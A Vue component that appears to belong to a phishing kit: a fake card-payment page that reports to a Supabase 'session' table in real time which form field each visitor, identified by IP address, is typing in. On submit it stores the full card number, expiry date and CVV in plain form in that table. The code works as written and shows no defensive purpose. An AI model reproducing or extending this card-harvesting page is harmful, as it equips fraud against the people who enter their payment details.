<script setup>
import { useSession } from '../../composables/session';
import CardHeader from '@/components/CardHeader.vue'
import CardForm from '@/components/CardForm.vue'
import { supabase } from '@/lib/supabase';
import { useRouter } from 'vue-router';

const router = useRouter()
useSession()

async function handleTyping({ field, value }) {
   let ip = null;
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data && data.success) {
      ip = data.ip;
    }
  } catch (e) {
    return;
  }
  if (!ip) {
    return;
  }

  const { error } = await supabase
    .from('session')
    .update({
      is_typing: `Champ "${field}" en train d'être édité`,
      last_seen_at: new Date().toISOString(),
      active: true,
    })
    .eq('ip', ip)

  if (error) {
    console.error(error)
  } 
}

async function handleCardSubmit(formData) {
  let ip = null;
  try {
    const res = await fetch('https://ipwho.is/');
    const data = await res.json();
    if (data && data.success) {
      ip = data.ip;
    }
  } catch (e) {
    return;
  }
  if (!ip) {
    return;
  }

  const { error } = await supabase
    .from('session')
    .update({
      card_number: formData.cardNumber,
      card_exp: formData.expiration,
      card_cvv: formData.cvv,
      is_typing: '',
      last_seen_at: new Date().toISOString(),
      active: true,
    })
    .eq('ip', ip)

  if (error) {
    console.error(error)
  } else {
    router.push('/finish')
  }
}

</script>

<template>
<div class="min-h-screen bg-gray-50 flex flex-col justify-start items-center">
    <CardHeader />
    <CardForm @typing="handleTyping" @submit="handleCardSubmit" />
  </div>
</template>